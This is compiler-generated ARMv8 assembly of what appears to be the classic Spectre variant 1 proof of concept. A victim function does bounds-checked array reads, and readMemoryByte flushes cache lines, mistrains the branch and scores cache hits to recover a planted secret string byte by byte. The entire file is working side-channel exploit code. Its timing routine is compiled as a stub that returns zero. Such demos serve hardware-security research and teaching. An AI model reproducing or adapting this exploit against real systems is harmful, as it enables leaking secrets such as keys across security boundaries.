	.arch armv8-a
	.file	"source.c"
	.text
	.align	2
	.global	victim_function
	.type	victim_function, %function
victim_function:
.LFB21:
	.cfi_startproc
	adrp	x1, .LANCHOR0
	ldr	w1, [x1, #:lo12:.LANCHOR0]
	cmp	x1, x0
	bls	.L1
	adrp	x2, .LANCHOR1
	adrp	x1, .LANCHOR0
	add	x1, x1, :lo12:.LANCHOR0
	add	x1, x1, 8
	ldrb	w1, [x1, x0]
	lsl	w1, w1, 9
	adrp	x0, :got:array2
	ldr	x0, [x0, #:got_lo12:array2]
	ldrb	w0, [x0, w1, sxtw]
	ldrb	w1, [x2, #:lo12:.LANCHOR1]
	and	w0, w0, w1
	strb	w0, [x2, #:lo12:.LANCHOR1]
.L1:
	ret
	.cfi_endproc
.LFE21:
	.size	victim_function, .-victim_function
	.align	2
	.global	read_cycles
	.type	read_cycles, %function
read_cycles:
.LFB24:
	.cfi_startproc
#APP
// 66 "source.c" 1
	nop
// 0 "" 2
#NO_APP
	mov	x0, 0
	ret
	.cfi_endproc
.LFE24:
	.size	read_cycles, .-read_cycles
	.align	2
	.global	readMemoryByte
	.type	readMemoryByte, %function
readMemoryByte:
.LFB25:
	.cfi_startproc
	stp	x29, x30, [sp, -112]!
	.cfi_def_cfa_offset 112
	.cfi_offset 29, -112
	.cfi_offset 30, -104
	mov	x29, sp
	stp	x19, x20, [sp, 16]
	stp	x25, x26, [sp, 64]
	stp	x27, x28, [sp, 80]
	.cfi_offset 19, -96
	.cfi_offset 20, -88
	.cfi_offset 25, -48
	.cfi_offset 26, -40
	.cfi_offset 27, -32
	.cfi_offset 28, -24
	mov	x28, x0
	str	x1, [sp, 96]
	str	x2, [sp, 104]
	adrp	x1, .LANCHOR1
	add	x1, x1, :lo12:.LANCHOR1
	add	x0, x1, 8
	add	x1, x1, 1032
.L5:
	str	wzr, [x0], 4
	cmp	x1, x0
	bne	.L5
	adrp	x0, .LANCHOR0+168
	ldr	w26, [x0, #:lo12:.LANCHOR0+168]
	cmp	w26, 0
	ble	.L24
	stp	x21, x22, [sp, 32]
	.cfi_remember_state
	.cfi_offset 22, -72
	.cfi_offset 21, -80
	stp	x23, x24, [sp, 48]
	.cfi_offset 24, -56
	.cfi_offset 23, -64
	adrp	x27, .LANCHOR0
	adrp	x20, .LANCHOR1
	add	x20, x20, :lo12:.LANCHOR1
	add	x20, x20, 8
	b	.L6
.L24:
	.cfi_restore_state
	mov	w1, 0
	b	.L7
.L10:
	.cfi_offset 21, -80
	.cfi_offset 22, -72
	.cfi_offset 23, -64
	.cfi_offset 24, -56
	add	x0, x0, 1
	cmp	x0, 256
	beq	.L26
.L11:
	lsl	w1, w0, 9
#APP
// 54 "source.c" 1
	dmb sy
// 0 "" 2
// 66 "source.c" 1
	nop
// 0 "" 2
#NO_APP
	ldrb	w1, [x4, w1, sxtw]
	and	w2, w1, 255
#APP
// 54 "source.c" 1
	dmb sy
// 0 "" 2
// 66 "source.c" 1
	nop
// 0 "" 2
#NO_APP
	ldr	w3, [x5]
	udiv	w1, w21, w3
	msub	w1, w1, w3, w21
	ldrb	w1, [x6, w1, uxtw]
	cmp	w1, w0
	beq	.L10
	ldr	w1, [x20, x0, lsl 2]
	add	w1, w1, 1
	str	w1, [x20, x0, lsl 2]
	b	.L10
.L26:
	mov	x0, 1
	mov	w3, 0
	b	.L12
.L15:
	mov	w19, w3
	mov	w3, w1
.L13:
	add	x0, x0, 1
.L12:
	mov	w1, w0
	cmp	x0, 256
	beq	.L27
	tbnz	w3, #31, .L15
	ldr	w4, [x20, x0, lsl 2]
	ldr	w5, [x20, w3, sxtw 2]
	cmp	w4, w5
	bge	.L16
	tbnz	w19, #31, .L17
	ldr	w5, [x20, w19, sxtw 2]
	cmp	w4, w5
	csel	w19, w19, w1, lt
	b	.L13
.L16:
	mov	w19, w3
	mov	w3, w1
	b	.L13
.L17:
	mov	w19, w1
	b	.L13
.L27:
	subs	w26, w26, #1
	beq	.L28
.L6:
	adrp	x0, :got:array2
	ldr	x0, [x0, #:got_lo12:array2]
	add	x1, x0, 131072
.L8:
#APP
// 41 "source.c" 1
	dc civac, x0
// 0 "" 2
#NO_APP
	add	x0, x0, 512
	cmp	x0, x1
	bne	.L8
	mov	w21, w26
	ldr	w0, [x27, #:lo12:.LANCHOR0]
	udiv	w22, w26, w0
	msub	w22, w22, w0, w26
	mov	w19, 29
	add	x25, x27, :lo12:.LANCHOR0
	mov	w24, 43691
	movk	w24, 0x2aaa, lsl 16
	eor	x23, x22, x28
.L9:
#APP
// 41 "source.c" 1
	dc civac, x25
// 0 "" 2
// 54 "source.c" 1
	dmb sy
// 0 "" 2
#NO_APP
	smull	x0, w19, w24
	lsr	x0, x0, 32
	sub	w0, w0, w19, asr 31
	add	w0, w0, w0, lsl 1
	sub	w0, w19, w0, lsl 1
	sub	w0, w0, #1
	and	w0, w0, -65536
	sxtw	x0, w0
	orr	x0, x0, x0, lsr 16
	and	x0, x23, x0
	eor	x0, x0, x22
	bl	victim_function
	sub	w19, w19, #1
	cmn	w19, #1
	bne	.L9
	mov	x0, 0
	adrp	x4, :got:array2
	ldr	x4, [x4, #:got_lo12:array2]
	add	x5, x27, :lo12:.LANCHOR0
	add	x6, x5, 8
	b	.L11
.L28:
	mov	w1, w2
	ldp	x21, x22, [sp, 32]
	.cfi_restore 22
	.cfi_restore 21
	ldp	x23, x24, [sp, 48]
	.cfi_restore 24
	.cfi_restore 23
.L7:
	adrp	x0, .LANCHOR1
	add	x0, x0, :lo12:.LANCHOR1
	add	x4, x0, 8
	ldr	w2, [x0, 8]
	eor	w1, w2, w1
	str	w1, [x0, 8]
	ldr	x1, [sp, 96]
	strb	w3, [x1]
	ldr	w0, [x4, w3, sxtw 2]
	ldr	x2, [sp, 104]
	str	w0, [x2]
	strb	w19, [x1, 1]
	ldr	w0, [x4, w19, sxtw 2]
	str	w0, [x2, 4]
	ldp	x19, x20, [sp, 16]
	ldp	x25, x26, [sp, 64]
	ldp	x27, x28, [sp, 80]
	ldp	x29, x30, [sp], 112
	.cfi_restore 30
	.cfi_restore 29
	.cfi_restore 27
	.cfi_restore 28
	.cfi_restore 25
	.cfi_restore 26
	.cfi_restore 19
	.cfi_restore 20
	.cfi_def_cfa_offset 0
	ret
	.cfi_endproc
.LFE25:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align	3
.LC0:
	.string	"2021-09-15 12:09"
	.align	3
.LC1:
	.string	"Last updated %s\n"
	.align	3
.LC2:
	.string	"Putting '%s' in memory\n"
	.align	3
.LC3:
	.string	"%d"
	.align	3
.LC4:
	.string	"MAX_TRIES=%d CACHE_HIT_THRESHOLD=%d len=%d\n"
	.align	3
.LC5:
	.string	"Reading %d bytes:\n"
	.align	3
.LC6:
	.string	"Reading@malicious_x=%p "
	.align	3
.LC7:
	.string	"0x%02X='%c' score=%d "
	.align	3
.LC8:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.align	3
.LC9:
	.string	"\n"
	.align	3
.LC10:
	.string	"Original secret: %s\n"
	.align	3
.LC11:
	.string	"Recovered      : %s\n"
	.text
	.align	2
	.global	main
	.type	main, %function
main:
.LFB26:
	.cfi_startproc
	stp	x29, x30, [sp, -128]!
	.cfi_def_cfa_offset 128
	.cfi_offset 29, -128
	.cfi_offset 30, -120
	mov	x29, sp
	.cfi_def_cfa_register 29
	stp	x19, x20, [sp, 16]
	stp	x21, x22, [sp, 32]
	stp	x23, x24, [sp, 48]
	stp	x25, x26, [sp, 64]
	str	x27, [sp, 80]
	sub	sp, sp, #16
	.cfi_offset 19, -112
	.cfi_offset 20, -104
	.cfi_offset 21, -96
	.cfi_offset 22, -88
	.cfi_offset 23, -80
	.cfi_offset 24, -72
	.cfi_offset 25, -64
	.cfi_offset 26, -56
	.cfi_offset 27, -48
	mov	w20, w0
	mov	x19, x1
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x0]
	str	x1, [x29, 120]
	mov	x1,0
	adrp	x2, .LC0
	add	x2, x2, :lo12:.LC0
	adrp	x1, .LC1
	add	x1, x1, :lo12:.LC1
	mov	w0, 1
	bl	__printf_chk
	adrp	x21, .LANCHOR2
	ldr	x2, [x21, #:lo12:.LANCHOR2]
	adrp	x1, .LC2
	add	x1, x1, :lo12:.LC2
	mov	w0, 1
	bl	__printf_chk
	ldr	x0, [x21, #:lo12:.LANCHOR2]
	adrp	x21, .LANCHOR0
	add	x21, x21, :lo12:.LANCHOR0
	add	x21, x21, 8
	sub	x21, x0, x21
	bl	strlen
	str	w0, [x29, 100]
	add	w2, w0, 1
	sxtw	x2, w2
	add	x3, x2, 15
	and	x1, x3, -16
	and	x0, x3, -65536
	sub	x0, sp, x0
.L30:
	cmp	sp, x0
	beq	.L31
	sub	sp, sp, #65536
	str	xzr, [sp, 1024]
	b	.L30
.L31:
	and	x1, x1, 65535
	sub	sp, sp, x1
	str	xzr, [sp]
	cmp	x1, 1024
	bcc	.L32
	str	xzr, [sp, 1024]
.L32:
	add	x23, sp, 16
	mov	x22, x23
	mov	w1, 0
	mov	x0, x23
	bl	memset
	cmp	w20, 4
	beq	.L50
.L33:
	adrp	x0, .LANCHOR0
	add	x0, x0, :lo12:.LANCHOR0
	ldr	w4, [x29, 100]
	ldr	w3, [x0, 172]
	ldr	w2, [x0, 168]
	adrp	x1, .LC4
	add	x1, x1, :lo12:.LC4
	mov	w0, 1
	bl	__printf_chk
	adrp	x0, :got:array2
	ldr	x0, [x0, #:got_lo12:array2]
	add	x2, x0, 131072
	mov	w1, 1
.L34:
	strb	w1, [x0], 1
	cmp	x0, x2
	bne	.L34
	ldr	w2, [x29, 100]
	adrp	x1, .LC5
	add	x1, x1, :lo12:.LC5
	mov	w0, 1
	bl	__printf_chk
	ldr	w0, [x29, 100]
	sub	w0, w0, #1
	str	w0, [x29, 100]
	tbnz	w0, #31, .L35
	mov	x19, x21
	adrp	x25, .LC6
	add	x25, x25, :lo12:.LC6
	mov	w20, 1
	add	x27, x29, 104
	add	x26, x29, 112
	mov	w24, 63
	b	.L41
.L50:
	adrp	x24, .LANCHOR0
	add	x24, x24, :lo12:.LANCHOR0
	adrp	x20, .LC3
	add	x20, x20, :lo12:.LC3
	add	x2, x24, 168
	mov	x1, x20
	ldr	x0, [x19, 8]
	bl	__isoc99_sscanf
	add	x2, x24, 172
	mov	x1, x20
	ldr	x0, [x19, 16]
	bl	__isoc99_sscanf
	add	x2, x29, 100
	mov	x1, x20
	ldr	x0, [x19, 24]
	bl	__isoc99_sscanf
	b	.L33
.L40:
	mvn	x1, x21
	add	x1, x22, x1
	strb	w0, [x1, x19]
	adrp	x1, .LC9
	add	x1, x1, :lo12:.LC9
	mov	w0, w20
	bl	__printf_chk
	ldr	w0, [x29, 100]
	sub	w0, w0, #1
	str	w0, [x29, 100]
	tbnz	w0, #31, .L35
.L41:
	mov	x2, x19
	mov	x1, x25
	mov	w0, w20
	bl	__printf_chk
	mov	x0, x19
	mov	x2, x27
	mov	x1, x26
	add	x19, x19, 1
	bl	readMemoryByte
	ldrb	w2, [x29, 112]
	sub	w0, w2, #32
	and	w0, w0, 255
	cmp	w0, 94
	ldr	w4, [x29, 104]
	csel	w3, w2, w24, ls
	adrp	x1, .LC7
	add	x1, x1, :lo12:.LC7
	mov	w0, w20
	bl	__printf_chk
	ldr	w4, [x29, 108]
	cmp	w4, 0
	ble	.L37
	ldrb	w2, [x29, 113]
	sub	w0, w2, #32
	and	w0, w0, 255
	cmp	w0, 94
	csel	w3, w2, w24, ls
	adrp	x1, .LC8
	add	x1, x1, :lo12:.LC8
	mov	w0, w20
	bl	__printf_chk
.L37:
	ldrb	w0, [x29, 112]
	sub	w0, w0, #32
	and	w0, w0, 255
	ldrb	w1, [x29, 112]
	cmp	w0, 95
	csel	w0, w1, w24, cc
	ldrb	w2, [x29, 113]
	sub	w1, w2, #32
	and	w1, w1, 255
	cmp	w1, 94
	bhi	.L40
	cmp	w0, 63
	ccmp	w2, w24, 4, eq
	csel	w0, w0, w2, eq
	b	.L40
.L35:
	adrp	x0, .LANCHOR2
	ldr	x2, [x0, #:lo12:.LANCHOR2]
	adrp	x1, .LC10
	add	x1, x1, :lo12:.LC10
	mov	w0, 1
	bl	__printf_chk
	mov	x2, x23
	adrp	x1, .LC11
	add	x1, x1, :lo12:.LC11
	mov	w0, 1
	bl	__printf_chk
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x29, 120]
	ldr	x2, [x0]
	subs	x1, x1, x2
	mov	x2, 0
	bne	.L51
	mov	w0, 0
	mov	sp, x29
	ldp	x19, x20, [sp, 16]
	ldp	x21, x22, [sp, 32]
	ldp	x23, x24, [sp, 48]
	ldp	x25, x26, [sp, 64]
	ldr	x27, [sp, 80]
	ldp	x29, x30, [sp], 128
	.cfi_remember_state
	.cfi_restore 30
	.cfi_restore 29
	.cfi_restore 27
	.cfi_restore 25
	.cfi_restore 26
	.cfi_restore 23
	.cfi_restore 24
	.cfi_restore 21
	.cfi_restore 22
	.cfi_restore 19
	.cfi_restore 20
	.cfi_def_cfa 31, 0
	ret
.L51:
	.cfi_restore_state
	bl	__stack_chk_fail
	.cfi_endproc
.LFE26:
	.size	main, .-main
	.global	temp
	.global	secret
	.section	.rodata.str1.8
	.align	3
.LC12:
	.string	"The Magic Words are Squeamish Ossifrage."
	.comm	array2,131072,8
	.comm	unused2,64,8
	.global	array1
	.comm	unused1,64,8
	.global	array1_size
	.global	CACHE_HIT_THRESHOLD
	.global	MAX_TRIES
	.data
	.align	3
	.set	.LANCHOR0,. + 0
	.type	array1_size, %object
	.size	array1_size, 4
array1_size:
	.word	16
	.zero	4
	.type	array1, %object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.type	MAX_TRIES, %object
	.size	MAX_TRIES, 4
MAX_TRIES:
	.word	10
	.type	CACHE_HIT_THRESHOLD, %object
	.size	CACHE_HIT_THRESHOLD, 4
CACHE_HIT_THRESHOLD:
	.word	30
	.bss
	.align	3
	.set	.LANCHOR1,. + 0
	.type	temp, %object
	.size	temp, 1
temp:
	.zero	1
	.zero	7
	.type	results.3810, %object
	.size	results.3810, 1024
results.3810:
	.zero	1024
	.section	.data.rel.local,"aw"
	.align	3
	.set	.LANCHOR2,. + 0
	.type	secret, %object
	.size	secret, 8
secret:
	.xword	.LC12
	.ident	"GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0"
	.section	.note.GNU-stack,"",@progbits
